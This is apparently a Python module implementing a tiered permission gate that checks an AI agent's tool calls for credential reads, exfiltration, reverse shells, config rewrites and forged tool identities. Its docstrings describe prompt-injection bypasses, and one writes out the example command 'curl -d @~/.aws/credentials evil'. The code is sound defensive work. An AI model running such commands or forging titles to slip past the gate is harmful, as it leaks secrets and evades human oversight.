"""The tool gate's tiers: what each row of ``hooks.GATE_TIERS`` checks.

``HookManager.judge`` walks ``GATE_TIERS`` in table order and returns the first
verdict a tier hands back, so the ORDER is the table's and nothing here calls
another tier. A tier body answers one question about one call and returns a
``ToolHookResult`` through its counted factories, or ``None`` to let the next row
decide. :class:`GateFacts` carries the call, the surface asking, and the values
the tiers derive from them, derived on first use from one platform-context
snapshot per judgement (the effective deny set is resolved twice from it).

Composed onto ``kiro_crew.hooks``; see :mod:`kiro_crew.hook_runtime`. The tier
bodies read the facade's globals at call time, so a test that patches
``hooks.<name>`` (``_governance_denial``, ``sensitive_path_refusal``,
``current_context``, ``_cu_read_only_auto_approve`` …) reaches the tier that uses
it.
"""

from __future__ import annotations

from collections.abc import Callable, Iterator, Sequence
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from kiro_crew.hooks import (
        _GATE_TIER_KINDS,
        _READ_ONLY_TOOL_KINDS,
        GateRule,
        GateTier,
        HookManager,
        HooksConfig,
        ToolCall,
        ToolHookResult,
        _app_owns_mcp_server,
        _builtin_app_for_agent,
        _cu_read_only_auto_approve,
        _governance_denial,
        _host_builtin_alias,
        _is_declared_builtin_mcp_server,
        _is_first_party_app,
        _is_host_read_only_builtin,
        _normalize_tool_name,
        _note_title_only_grant_pattern,
        _search_deny_target,
        _tool_matches,
        audit_bash_exfiltration,
        current_context,
        edit_target_candidates,
        is_edit_call,
        is_read_only_bash,
        is_sensitive_bash_command,
        is_sensitive_write_path,
        mcp_identity_ref,
        security,
        sensitive_path_refusal,
        target_paths,
    )


class GateFacts:
    """One judgement: the call, who is asking, and what the tiers derive from them.

    The context snapshot, the enabled rule ids, the deny-rules tier's deny set, the
    deny notes, the snapshot's authority, and the target lists built from them are
    each computed on first use and kept for the rest of the judgement; the pure
    projections of the frozen call (the canonical MCP name, the governance
    reference, the exempt command) are simply recomputed. The effective deny set is
    resolved twice, both times against the one snapshot: once for the enabled rule
    ids and once for the deny-rules tier. Two consequences matter. The platform
    context is read ONCE per call (:meth:`snapshot`), so a live ceiling refresh
    cannot land between two reads and judge one call half under the old ceiling
    and half under the new one. And a value no tier reaches is never computed -- a
    call the first tier denies reads neither the context nor the effective deny
    set -- so the gate reads them in the order its tiers first need them.

    ``config`` is NOT kept: it is the manager's live ``HooksConfig`` on every read,
    so a hot reload is seen by the next tier exactly as it was when the gate was
    one method.
    """

    def __init__(
        self,
        manager: HookManager,
        call: ToolCall,
        *,
        session_key: str,
        agent: str,
        app: str,
        classifier_only: bool,
    ) -> None:
        self.manager = manager
        self.call = call
        self.session_key = session_key
        self.agent = agent
        self.app = app
        self.classifier_only = classifier_only
        self._memo: dict[str, Any] = {}

    def _once(self, key: str, compute: Callable[[], Any]) -> Any:
        memo = self._memo
        if key not in memo:
            memo[key] = compute()
        return memo[key]

    @property
    def config(self) -> HooksConfig:
        return self.manager._config

    @property
    def normalized(self) -> str:
        """The title without its display prefix (``Running: ls *`` -> ``ls *``), so a
        config pattern like ``ls`` or ``rm *`` matches without the prefix."""
        return self._once("normalized", lambda: _normalize_tool_name(self.call.title))

    @property
    def security_targets(self) -> list[str]:
        """What the always-on checks judge: the normalized title AND the raw command.

        The command is the ground truth for shell tools; the title is retained so
        non-shell tools (whose identifier IS the title) stay gated and so a
        dangerous title can't slip through behind a benign command.
        """

        def compute() -> list[str]:
            targets = [self.normalized]
            command = self.call.command
            if command and command not in targets:
                targets.append(command)
            return targets

        return self._once("security_targets", compute)  # type: ignore[no-any-return]

    @property
    def raw_shell_commands(self) -> list[str]:
        """The tool's own ``command``/``cmd`` argument, when no shell command was recovered.

        A harness may stream its shell tool under a kind other than ``execute`` (the
        DeepSeek harness sends ``bash`` as ``other``), so no shell command is
        recovered and every check would see only the title. The tool's own
        ``command``/``cmd`` argument is then judged by the SHELL-class rules of the
        targets tier (scan ceiling, IMDS, env-credential, exfiltration) and by the
        deny-rule catalog -- never by the path rule, which reads a value as a
        filename. Deny-only: allow paths and the shell exemption still key on
        ``is_shell``/``command``, so this can refuse a call but never grant one. A
        call that names its MCP server is left out: its ``command``-named arguments
        are not shell text, and it is governed by ``@server/tool`` rules. A harness
        that names no server for its MCP calls (claude-agent-acp, opencode, dsh, pi)
        cannot be told apart here, so such a call's ``command`` argument is checked
        too.
        """

        def compute() -> list[str]:
            call = self.call
            raw_params = call.raw_params
            commands: list[str] = []
            if not call.command and not call.mcp_server and isinstance(raw_params, dict):
                for key in ("command", "cmd"):
                    raw_command = raw_params.get(key)
                    if isinstance(raw_command, str) and raw_command and raw_command not in commands:
                        commands.append(raw_command)
            return commands

        return self._once("raw_shell_commands", compute)  # type: ignore[no-any-return]

    def snapshot(self) -> None:
        """Take the gate's ONE context snapshot and the enabled rule ids it yields.

        Reused by the catalog checks further down the table. Reading
        ``current_context()`` twice let a live ceiling refresh land between the
        reads, so a single tool call could be judged half under the old ceiling and
        half under the new one. The direction that matters: the structural
        IMDS/exfil checks are the only ones that catch an ENCODED address
        (``credential-exfil-imds-any`` exists precisely because the curl/wget
        patterns match a literal dotted quad), so a governance pin arriving after
        the snapshot could never be applied to the encoded form -- honouring a pin
        late is not honouring it.
        """
        self.enabled_ids  # noqa: B018 - computed for its context read, in this order

    @property
    def ctx(self) -> Any:
        return self._once("ctx", current_context)

    @property
    def enabled_ids(self) -> Any:
        """The always-on gates are keyed by rule id, so the effective regex set is
        resolved to ids ONCE and threaded in. ``None`` means all enabled, which is
        what the callers outside this gate (cron command vetting, computer-use
        input vetting) keep passing."""
        return self._once(
            "enabled_ids",
            lambda: security.enabled_rule_ids(self.manager._effective_denied(self.ctx)),
        )

    @property
    def exempt_command(self) -> str | None:
        """The one target the path rule does not resolve: a SANDBOXED shell's command.

        kiro-cli can classify an execute-kind frame as shell while also naming an
        MCP server (``classify_tool_call``: the identity is carried, the shell
        verdict stands), and an MCP-served tool runs outside the agent sandbox that
        this exemption leans on -- so its targets stay path-gated. Likewise a
        shell-kind tool with structured parameters (``use_aws``) may carry a
        discrete credential path as an argument, and in ``standard`` sandbox mode
        ``~/.aws`` is visible to the shell: the param-paths tier is the control
        there, so only the command text itself (the normalized title when it IS the
        command, and ``command``) is spared the resolver.
        """
        call = self.call
        return call.command if (call.is_shell and call.command and not call.mcp_server) else None

    @property
    def authority(self) -> Any:
        """The snapshot's ``PolicyAuthority``. Through it the companion's ADD-only
        deny overlay (+ internal patterns) applies when loaded; the standalone
        Default authority has an empty overlay, so it resolves to
        ``security.is_denied(name, auto_deny_tools)`` exactly -- no recursion
        (``PolicyAuthority.is_denied`` calls ``security.is_denied`` with the overlay
        patterns appended; ``security.is_denied`` never calls back)."""
        return self._once("authority", lambda: self.ctx.security)

    @property
    def denied_regexes(self) -> list[str]:
        return self._once(  # type: ignore[no-any-return]
            "denied_regexes", lambda: self.manager._effective_denied(self.ctx)
        )

    @property
    def denied_notes(self) -> dict[str, str]:
        return self._once("denied_notes", self.manager._denied_notes)  # type: ignore[no-any-return]

    @property
    def canonical_mcp_name(self) -> str:
        """The ``mcp__<server>__<tool>`` identity, when kiro-cli supplied BOTH trusted
        ``_meta.kiro`` fields.

        ``select_tool_title`` prefers the model's prose ``description``, so the
        title of an MCP call may be "Look up the weather" rather than the canonical
        form a per-tool deny rule or MCP policy matches on. Reconstructing it on the
        COMMON path, before the deny floor and governance, is what makes a rule
        keyed on the real tool identity bind for every consumer of this gate, not
        only for the first-party own-server grant.
        """
        call = self.call
        return (
            f"mcp__{call.mcp_server}__{call.mcp_tool}" if call.mcp_server and call.mcp_tool else ""
        )

    @property
    def deny_targets(self) -> list[str]:
        """What the effective deny set is asked about.

        The normalized and original title, then the trusted identities, then the
        raw command, then any :attr:`raw_shell_commands` not already listed.
        ADDITIVE, never a substitution: the title and the raw command
        stay in every check they were already in. They are not competing spellings
        of one fact -- the canonical name is the trusted statement of WHICH tool
        runs, which is what a per-tool rule matches, while the title and command
        carry the path/command/content signals that identity does not express. Each
        covers a security dimension the other cannot, so both are evaluated and a
        deny on either denies. Both identity fields empty (a non-MCP call, or a
        backend that omits ``_meta.kiro``) leaves every target exactly as before.

        The trusted tool identity on its own is the ONLY form a built-in carries:
        kiro-cli sets ``_meta.kiro.toolName`` for every tool call but
        ``mcpServerName`` only for MCP-served ones, so the canonical form is empty
        for a built-in and its real name would otherwise reach no check at all --
        leaving ``deny = ["fs_write"]`` bypassable behind a benign model-authored
        title. It is appended whenever present, MCP or not, because a deny target
        can only ever DENY: an identity the model could influence cannot waive a
        rule here, at most it matches one it did not need to.
        """

        def compute() -> list[str]:
            call = self.call
            targets = [self.normalized, call.title]
            if self.canonical_mcp_name:
                targets.append(self.canonical_mcp_name)
            if call.mcp_tool and call.mcp_tool not in targets:
                targets.append(call.mcp_tool)
            alias = _host_builtin_alias(call.mcp_tool, call.mcp_server)
            if alias and alias not in targets:
                targets.append(alias)
            if call.command:
                targets.append(call.command)
            for raw_command in self.raw_shell_commands:
                # Already past the scan ceiling in the targets tier.
                if raw_command not in targets:
                    targets.append(raw_command)
            return targets

        return self._once("deny_targets", compute)  # type: ignore[no-any-return]

    @property
    def governance_mcp_ref(self) -> str:
        """What the GOVERNANCE plane is asked about for the trusted identity.

        NOT the same string as the deny plane's canonical name, because that plane
        has a SERVER level the deny plane does not and it matches canonical
        references rather than raw titles. The ``mcp__<server>__<tool>`` title is a
        LOSSY encoding: the parser that reads it splits on the LAST ``__``, so it can
        carry any server name but never a tool name containing ``__``. ``@github`` +
        ``repo__delete`` encodes to ``mcp__github__repo__delete`` and reads back as
        server ``github__repo`` with tool ``delete``, so a ``deny
        @github/repo__delete`` ceiling never binds and a human is asked to approve
        a tool the policy forbids. No spelling of that title fixes it -- the
        ambiguity is in the format -- so the trusted fields are composed straight
        into the canonical ``@server/tool`` form the matcher documents, where ``/``
        separates and neither segment can contain it. A server with no proven tool
        asks the server-level question ``@server``, which a ``@server`` rule matches
        and a ``@server/tool`` rule correctly does not.

        Deliberately NOT a deny target: that plane matches raw text and operator
        regexes, where a canonical reference is a DIFFERENT string from the raw
        identity a rule is written against rather than a broader form of it, and
        feeding it there would widen matching by accident instead of by grammar.
        """
        return mcp_identity_ref(self.call.mcp_server, self.call.mcp_tool)


# ── deny tiers ────────────────────────────────────────────────────────────────


def _tier_unverifiable_shell(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """Deny-by-default: a shell tool whose command could not be recovered must not
    be evaluated on the untrusted title alone -- that is the very bypass this gate
    closes. Reject instead of falling through.

    This refusal is UNCONDITIONAL, and deliberately has no operator override. An
    override was implemented and removed: ``ToolHookResult`` carries only
    ``allow`` / ``auto_approve`` / ``deny``, so a suppressed call can at best
    return ``allow``, and ``allow`` falls through to patterns / trust-reads /
    trust / YOLO / interactive in the dashboard runner. Under YOLO -- or a trust
    grant, or native-crew auto-approve -- the unverified command would then
    execute with no human ever seeing it, which is precisely what this gate exists
    to prevent, in exactly the configuration an operator who wants the
    convenience is likeliest to run. Barring the hook-level auto-approve branches
    is NOT sufficient, because the decision is re-made downstream.

    The false-positive that motivated the override (a provider payload shape this
    build does not recognize yields no command even for an ordinary call -- see
    ``AcpEvent.shell_command``) is real, but the fix belongs in recognizing the
    payload shape, not in admitting commands no gate read. Making this
    suppressible would need a fourth action meaning "force the interactive prompt,
    and let no downstream tier auto-grant it".
    """
    call = facts.call
    if call.is_shell and not call.command:
        return ToolHookResult.deny(
            "Blocked: shell command could not be verified for security policy (deny-by-default)"
        )
    return None


def _tier_targets(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """Every rule of the tier against every security target, TARGET-MAJOR.

    The normalized title's rules all run before the raw command's, and within one
    target the rules run in the table's order, so when several would refuse, the
    first target's first refusing rule names the verdict.

    Sensitive path protection is always enforced, before all other checks.
    kiro-cli adds "Reading "/"Running: " display prefixes; the claude-agent-acp
    adapter does NOT (its file-read title is the bare path, its Bash title the
    bare command). So the prefix only HINTS at the tool kind -- every check runs
    on every target regardless of prefix, or credential reads slip through on the
    Claude Code provider. Each target is the normalized title AND (for shell
    tools) the raw command, so an LLM-authored benign title can't hide a
    dangerous command from any of these gates.

    Then each of :attr:`GateFacts.raw_shell_commands` meets the SHELL-class rules
    only -- the rules that name a ``shell_rule``, in the same order -- and never
    the path rule. The size ceiling is pass 0 of ``is_sensitive_bash_command``, so
    a value over it is refused before any regex here or in the deny catalog runs.
    """
    targets = facts.security_targets
    raw_commands = facts.raw_shell_commands
    facts.snapshot()
    for target in targets:
        for rule in tier.rules:
            reason = rule.check(facts, target)
            if reason:
                verdict = ToolHookResult.deny(reason)
                verdict.tier = rule.name
                return verdict
    for target in raw_commands:
        for rule in tier.rules:
            if not rule.shell_rule:
                continue
            reason = rule.check(facts, target)
            if reason:
                verdict = ToolHookResult.deny(reason)
                verdict.tier = rule.name
                return verdict
    return None


def _rule_sensitive_path(facts: GateFacts, target: str) -> str | None:
    """The path tier, reason-or-None like the two rules after it: a stall is refused
    with its own wording (unverifiable, not a match) instead of being reported as a
    credential hit on whatever the target happened to be.

    ``is_sensitive_path`` resolves the value as a path: a real file-read title
    (``~/.aws/credentials``) matches, while a bash command (``cat
    ~/.aws/credentials``) resolves to a non-sensitive path and is NOT matched on
    its text -- the OS sandbox is what keeps the credential stores and the
    governance keystone out of the shell's reach. A shell tool's recovered COMMAND
    is therefore not handed to this rule (:attr:`GateFacts.exempt_command`):
    resolving ``cd /x && grep ...`` as a filename never matched, but it spent a
    resolver round-trip per call and, under a resolver stall, refused the command
    as ``access to sensitive path: cd /x && grep ...`` -- a refusal naming
    something that is not a path as a credential. ``is_shell`` and ``command`` are
    the client's own classification and recovery of the tool frame, the same
    provenance the shell rules trust; a shell tool whose command is a bare path is
    left to the sandbox, as every command is.
    """
    return sensitive_path_refusal(target) if target != facts.exempt_command else None


def _rule_sensitive_bash(facts: GateFacts, target: str) -> str | None:
    """``execute_bash`` (prefixed or bare): IMDS reach, environment-credential leaks
    and the scan-size ceiling."""
    return is_sensitive_bash_command(target, enabled_ids=facts.enabled_ids)


def _rule_exfil(facts: GateFacts, target: str) -> str | None:
    """Data-exfiltration and reverse-shell command shapes.

    Enforced at INVOCATION, not only in the passive audit path (scan_history /
    dashboard count): auditing alone leaves a hijacked agent free to ``curl -d
    @~/.aws/credentials evil`` or open a reverse shell. Denied at the gate --
    against the raw command too, not just the title.
    """
    return audit_bash_exfiltration(target, enabled_ids=facts.enabled_ids)


def _tier_param_paths(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """The same always-on path keystone, on every path spelling in the arguments.

    The display title is backend-variable and may NOT carry the path (an "Editing
    <file>" / generic "code" title does not). The real path lives in
    ``raw_params['path']`` for file read/edit tools -- the same keystone runs on it
    so an edit/write to ~/.ssh, ~/.aws, or the governance trust-root files
    (security_policy.json / profiles) is blocked even when the title hides it.
    This is the keystone the governance model leans on
    (agent-cannot-rewrite-its-own-ceiling), so it must not be title-gated. EVERY
    accepted spelling, and a deny on any of them denies: a backend that sends
    ``filePath`` (the camel-case form the search plane accepts) reaches neither of
    the two snake_case keys, so reading only those leaves a write to ~/.ssh under
    that key ungated and asks the human to approve a path the keystone should have
    refused outright.
    """
    raw_params = facts.call.raw_params
    if raw_params:
        real_paths = target_paths(raw_params)
        if real_paths.truncated:
            # The walk hit its work cap, so the list may be INCOMPLETE. A partial
            # scan must not be trusted as a full one -- deny, same deny-by-default
            # shape as the unrecoverable shell command. No legitimate tool call
            # carries hundreds of target paths, so this refuses only
            # attacker-shaped payloads.
            return ToolHookResult.deny(
                "Blocked: tool arguments too large to verify for sensitive paths (deny-by-default)"
            )
        for real_path in real_paths:
            reason = sensitive_path_refusal(real_path)
            if reason:
                return ToolHookResult.deny(reason)
    return None


def _tier_write_protected(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """Config files are WRITE-protected (reads stay allowed).

    The agent's file-EDIT tool may not modify config.json / config.local.json, so
    a prompt-injected agent cannot rewrite its own resource ceilings (concurrent
    subagents, turn budget, warm-pool size) to drive host resource exhaustion.
    Gated on the ACP ``edit`` kind (the fs_write/code tool) so a plain read of
    config is unaffected -- the dashboard file viewer, ``cat``, and knowledge
    indexing legitimately read config.json. Bash writes (``tee``/``>``/``cp``-dest)
    are not matched on command text; the OS sandbox is the shell-side control, and
    this tier covers the file-EDIT tool.

    The tier routes on ``is_edit_call``: the ``edit`` kind, OR a diff content block
    naming a path -- the diff block is the edit's target of record, and only a call
    declaring a file change carries one, so its PRESENCE is write-plane evidence
    however the spec-optional ``kind`` field arrived (empty, or even ``read``). The
    read allowance is keyed on the ABSENCE of a diff block, not on the kind: a
    kindless call WITHOUT one stays a read, because ``governance._scopes_for_call``
    (platform/governance.py) infers BOTH filesystem.read AND filesystem.write from
    a lone ``path`` when the kind is empty as a *policy intersection* where an
    ungoverned scope permits, while this gate is a HARD deny -- applying that shape
    inference to diff-less calls would block legitimate config READS, regressing
    the read-allowance that is the whole point of the write-only tier. The OS
    sandbox covers the shell surface.
    """
    call = facts.call
    if is_edit_call(call.kind, call.diff_path) and (call.raw_params is not None or call.diff_path):
        # Same spelling coverage as the sensitive-path keystone, for the same
        # reason: the write-protected tier is worthless if a config edit can name
        # its target under a key the check never reads. The judged set is the
        # UNION of the params' path spellings and the diff content block's path,
        # computed by the SAME helper the always-enforced tier uses
        # (``edit_target_candidates``): a backend may stream params that carry no
        # path key at all and name the file only in that block, so the params
        # alone can judge nothing.
        candidates = edit_target_candidates(call.raw_params, call.diff_path)
        if candidates.truncated:
            # Unreachable while the param-paths tier denies a truncated walk first,
            # but this tier keeps its own fail-closed reading so a reorder of the
            # table cannot silently turn a partial scan into a pass.
            return ToolHookResult.deny(
                "Blocked: tool arguments too large to verify for sensitive paths (deny-by-default)"
            )
        if candidates.unanchored:
            # The diff block's path is a verbatim backend field. A relative one
            # resolves against the gateway process CWD, not the agent workspace, so
            # a workspace symlink can point it at a protected file no gate would
            # recognize under its unanchored spelling -- deny as unverifiable, same
            # fail-closed shape as truncation.
            return ToolHookResult.deny(
                "Blocked: file edit names a relative target path that "
                "cannot be verified (deny-by-default)"
            )
        if not candidates:
            # Mirrored from the always-enforced tier: a declared file edit whose
            # params and content block together name no target has no proven target
            # to judge -- deny rather than approve blind. ``raw_params={}`` takes
            # this deny too (the tier enters on ``is not None``, not truthiness),
            # matching ``_edit_target_denial``, which selects ANY dict via
            # ``isinstance`` and denies its empty union -- a falsy-guard skip here
            # would be the fail-open the two-gate parity exists to prevent. Scoped
            # to the edit kind: the empty/unknown ``kind`` case stays a read
            # allowance, and an edit event carrying ``raw_params=None`` and no diff
            # block never enters this tier (matching ``_edit_target_denial``, which
            # such an edit never reaches either).
            return ToolHookResult.deny(
                "Blocked: file edit names no target path to verify (deny-by-default)"
            )
        for wpath in candidates:
            if is_sensitive_write_path(wpath):
                return ToolHookResult.deny(
                    f"Blocked: modification of write-protected config path: {wpath}"
                )
    return None


def _tier_deny_rules(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """The built-in security deny list plus the operator's rules, always enforced.

    Routed through the snapshot's ``PolicyAuthority`` (:attr:`GateFacts.authority`)
    and asked about every deny target (:attr:`GateFacts.deny_targets`): the raw
    command (ground truth) as well as the normalized and original title forms and
    the trusted identities. It reuses the ONE snapshot taken by the targets tier --
    a second read here would let a ceiling refresh split this call's verdict across
    two policy states.
    """
    authority = facts.authority
    denied_regexes = facts.denied_regexes
    denied_notes = facts.denied_notes
    for target in facts.deny_targets:
        reason = authority.is_denied(
            target,
            facts.config.auto_deny_tools,
            denied_regexes=denied_regexes,
            reason_notes=denied_notes,
        )
        if reason:
            return ToolHookResult.deny(reason)
    return None


def _tier_mcp_auto_deny(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """The operator's own ``auto_deny_tools`` GLOBS, and only those, against the
    ``_meta.kiro`` server/tool identity (verified or not) in the ``@server/tool``
    spelling the grant tier uses.

    Plus ``Running: @server/tool`` and the bare ``@server``, so a server-level rule
    binds to every tool. A user who writes both lists in one spelling --
    ``auto_approve_tools: ["@ops/*"]``, ``auto_deny_tools: ["@ops/delete_*"]`` --
    otherwise gets an approve keyed on the verified identity while the deny rides
    the forgeable title, and a benign title over a denied tool auto-fires. Kept OUT
    of the deny targets on purpose: the shipped regex rules are authored against
    shell text, and running them over a synthesized reference is the accidental
    widening :attr:`GateFacts.governance_mcp_ref` forbids. Not gated on
    provenance: a deny can only ever deny.
    """
    call = facts.call
    if call.mcp_server and facts.config.auto_deny_tools:
        tool_ref = mcp_identity_ref(call.mcp_server, call.mcp_tool)
        for ref in (tool_ref, f"Running: {tool_ref}", mcp_identity_ref(call.mcp_server, "")):
            if ref and any(_tool_matches(pattern, ref) for pattern in facts.config.auto_deny_tools):
                return ToolHookResult.deny(f"Blocked by security policy: {ref}")
    return None


def _tier_search_target(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """A file-search builtin's scope, which lives only in its arguments.

    It carries no ``command``, and its title need not name the root it walks, so
    this target is the only form in which a deny rule can see a whole-tree walk.

    It is evaluated in its OWN tier, not as one more deny target, because it is
    not a command line: run through the shared rule set it collides with the
    command-oriented built-ins on argument text (the ``mkfs.*`` rule denying a
    read-only search of a directory named ``mkfs-tests``), and the only per-rule
    remedy -- disabling that rule by id -- also stops it protecting real shell
    commands.

    The patterns that PARTICIPATE are passed explicitly: the operator's own enabled
    regexes, never the merged effective set. That is what makes provenance
    structural rather than inferred -- classifying the merged set by pattern TEXT
    cannot tell an operator's rule from a shipped one when the text coincides
    (``mkfs.*`` is a natural thing to type), and reading the operator's own rule as
    shipped would silently drop an explicit deny. The shipped catalogue takes no
    part here at all: none of its rules is authored against the synthesized grammar
    (ratcheted in the tests), so a built-in's only possible hit is the incidental
    one this tier exists to drop.
    """
    search_target = _search_deny_target(facts.call.raw_params)
    if search_target:
        config = facts.config
        reason = facts.authority.is_denied_synthesized_target(
            search_target,
            [p.pattern for p in config.denied_commands_user_added if p.enabled],
            extra_patterns=facts.config.auto_deny_tools,
            reason_notes=facts.denied_notes,
        )
        if reason:
            return ToolHookResult.deny(reason)
    return None


def _tier_governance(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """Governance ceiling ∩ active profile (Level 1 ∩ Level 2).

    Runs BEFORE the grant tiers so a governance deny wins over a user auto-approve
    and is never bypassed. This is the layer that denies a tool/MCP call even when
    the kiro agent config granted it, by name, regardless of kiro's allowedTools.
    No-op on a standalone host with no policy and no bound profile (gate_decision
    permits), so behavior is unchanged unless governance is configured. A deny here
    is POLICY state (``deny_policy``), which the same attempt can outlive.

    Governance is asked about the display title AND, separately, the trusted MCP
    identity, which travels as the canonical reference
    (:attr:`GateFacts.governance_mcp_ref`) because the title grammar cannot
    round-trip every name; a deny on either is final. An absent identity (a non-MCP
    call) is not asked about at all -- an empty title classifies to the unprefixed
    scopes, where it is a queryable item rather than a no-op, so querying it could
    deny on a rule it has nothing to do with. ONE query, every identity: asking them
    as separate calls re-resolved the active profile each time, so a profile
    hot-reloaded mid-call could answer each question from a different snapshot and
    permit a tool that both complete profiles deny -- and each extra call walked
    ``profiles/`` synchronously on the event loop. Tightest-wins is preserved: a
    deny on any identity denies the call.
    """
    call = facts.call
    # The trusted name and, for an aliased built-in stamp, the spec spelling a
    # rule is written in; both in the one query, neither repeating the title.
    alias = _host_builtin_alias(call.mcp_tool, call.mcp_server)
    extra_titles = tuple(name for name in (call.mcp_tool, alias) if name and name != call.title)
    gov_reason = _governance_denial(
        facts.ctx,
        call.title,
        facts.session_key,
        facts.agent,
        facts.app,
        call.kind,
        call.raw_params,
        diff_path=call.diff_path,
        mcp_ref=facts.governance_mcp_ref,
        extra_titles=extra_titles,
        spawn_target=call.spawn_target,
    )
    if gov_reason:
        return ToolHookResult.deny_policy(gov_reason)
    return None


# ── grant tiers (both skipped under ``classifier_only``) ──────────────────────


def _tier_app_own_server(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """A FIRST-PARTY (builtin) app agent calling its OWN app-scoped MCP server.

    That is intra-app, not a host surface. A builtin app's declared server is
    registered under the ``<app>:<server>`` key (see ``apps/bridges.py``) and IS the
    gateway's own shipped code, so it only touches the app's own data -- never
    fs/network/exec/exfil on the host. Once a shipped app agent stopped
    pre-authorizing tools (no template ``allowedTools``, the "no template
    pre-authorizes tools" invariant), even those intra-app calls fell through to an
    interactive prompt the user could not meaningfully act on (the app was blocked
    from talking to itself). Auto-approving them here restores that UX without
    re-widening any host grant.

    Keyed on the NON-model-authored ``mcp_server`` (the ACP
    ``_meta.kiro.mcpServerName``), NEVER on the LLM-authored title: a
    prompt-injected agent can title a Bash call ``mcp__<app>:srv__x``, but kiro-cli
    only sets ``mcp_server`` for a genuine MCP-served call, so a forged shell/host
    title carries an empty server name and never matches (fail-closed). Restricted
    to builtins on purpose: only a builtin's server is provably first-party. A
    THIRD-PARTY app's server is arbitrary installed code whose internals the gate
    cannot see, so its own-server calls are NOT auto-approved here -- the OS
    sandbox it runs under and the third-party admission gate bound its behavior
    instead.

    Placed AFTER every deny tier and governance in the table, so a ceiling/profile
    can still deny even a builtin's own server and every sensitive-path / keystone
    / exfil deny still wins; and before the interactive fall-through, independent
    of the Normal/Read/Trust tier (that tier governs the HOST tools an app agent may
    reach, not the app talking to its own server). Generic App Kit contract keyed
    only on the ``<app>:<server>`` convention + shipped-manifest provenance -- no
    per-app special-casing.

    ``_app_owns_mcp_server`` only proves the NAME is ``<app>:``-prefixed;
    ``_own_mcp_servers`` (bridges.py) injects app servers into the agent by reading
    that prefix from the MUTABLE global MCP config, so a ``<app>:evil`` entry that
    landed there (not declared by the app) would otherwise be trusted. The server
    must be DECLARED in the app's SHIPPED manifest
    (``_is_declared_builtin_mcp_server``, an in-memory set warmed at boot from
    immutable manifests -- same discipline as ``_BUILTIN_APP_NAMES``) so only a
    genuinely app-own server auto-approves.

    An app identity is recovered for a builtin whose slot carries NONE. Only a
    request with an authenticated app scope sets ``Slot._app``, so a builtin whose
    UI is not an app iframe (an Electron window using the dashboard session cookie)
    binds its slot with an empty app and every condition keyed on it fails -- the
    app could not talk to its own server. The slot's own ``app`` wins whenever it
    HAS one, so an app-scoped session behaves exactly as before; the derived value
    is used ONLY for this grant and is never written back to the slot (see
    ``_builtin_app_for_agent`` -- ``_app`` also drives app isolation). Keyed on
    ``resolved_agent`` (what ACTUALLY ran), NEVER on ``agent``: the latter is the
    slot's ALIAS, which ``resolve_agent_bindings`` maps to a concrete kiro agent
    before dispatch, so a user-defined alias named after a builtin's agent could
    otherwise borrow that app's identity for a completely different runtime agent.
    An empty ``resolved_agent`` (an uncached permission event, or a caller that does
    not thread it through) yields no identity -- fail-closed to interactive
    approval.

    Both grant tiers vouch for the CALLER and say nothing about what the call does,
    so ``classifier_only`` skips them and the read-only classifier judges the call
    on its own merits (a grant that shadows a read costs nothing, a grant that
    shadows a write approves nothing). The owner app is resolved before that check,
    as it always was, so a malformed resolved agent is refused (as a gate crash)
    whatever the mode.
    """
    call = facts.call
    owner_app = facts.app or _builtin_app_for_agent(call.resolved_agent)
    if (
        not facts.classifier_only
        and _app_owns_mcp_server(call.mcp_server, owner_app)
        and _is_first_party_app(owner_app)
        and _is_declared_builtin_mcp_server(call.mcp_server)
    ):
        # The deny tiers have already run against ``canonical_mcp_name`` and
        # governance against the identity reference, so a ceiling or profile
        # denying ONE tool of this server -- or the server as a whole -- has
        # returned a deny and cannot reach this grant. Those checks live there
        # only, so there is one copy to keep in step rather than two.
        #
        # The identity requirement is what this tier enforces: a missing trusted
        # tool name (a backend without ``_meta.kiro.toolName``, or an uncached
        # permission event) leaves ``canonical_mcp_name`` empty, which means WHICH
        # tool this is cannot be proven -- and an unidentifiable tool must not be
        # auto-approved on the strength of its server alone. Fall through to
        # interactive approval (fail-closed), never silent execute.
        if facts.canonical_mcp_name:
            return ToolHookResult.auto_approve(identity_grant=call.identity_trusted)
    return None


def _tier_operator_grants(facts: GateFacts, tier: GateTier) -> ToolHookResult | None:
    """The operator's ``auto_approve_tools`` patterns.

    Matched against both the original title (preserves "Running: "/"Reading "
    prefixes) and the normalized name (stripped), so "Running: *" and bare
    tool-name patterns both work. This matches the TITLE, which the agent authors
    -- safe here ONLY because a shell call whose command could not be recovered was
    already hard-denied by the first tier, so no unverified command can reach it.
    Do not weaken that refusal without also gating this tier.

    For an MCP-served call whose canonical identity is VERIFIED -- both
    ``_meta.kiro`` fields present AND the ``identity_trusted`` provenance flag set
    (the event's own flag, earned only when the identity came from the client's
    tool_call cache; non-emptiness alone is not provenance, see
    ``AcpEvent.mcp_identity_trusted``) -- the pattern is matched against THAT
    identity, in place of the title. A grant keyed on the title would let a
    model-authored ``description`` that reads like an allowed tool approve a
    different one; keyed on the identity, the pattern approves exactly the tool
    that executes. Two spellings of the same identity: kiro-cli's own title form
    ``Running: @server/tool`` and the governance reference ``@server/tool``
    (``mcp_identity_ref``). The wire form ``mcp__server__tool`` is deliberately NOT
    a grant target: a server or tool name may itself contain ``__``, so two
    different verified identities can share one wire spelling, and a grant written
    against it would approve the other tool. The deny list may accept that form
    (over-denying is safe); a grant may not. An identity that is present but
    unproven falls back to the title, exactly as before.

    ``classifier_only`` skips this tier (see the app-own-server tier for why).
    """
    if facts.classifier_only:
        return None
    call = facts.call
    identity_ref = (
        mcp_identity_ref(call.mcp_server, call.mcp_tool)
        if call.mcp_server and call.mcp_tool and call.identity_trusted
        else ""
    )
    grant_targets: tuple[str, ...]
    if identity_ref:
        grant_targets = (f"Running: {identity_ref}", identity_ref)
        identity_grant = True
    else:
        grant_targets = (call.title, facts.normalized)
        identity_grant = False
    for pattern in facts.config.auto_approve_tools:
        if any(_tool_matches(pattern, target) for target in grant_targets):
            return ToolHookResult.auto_approve(identity_grant=identity_grant)
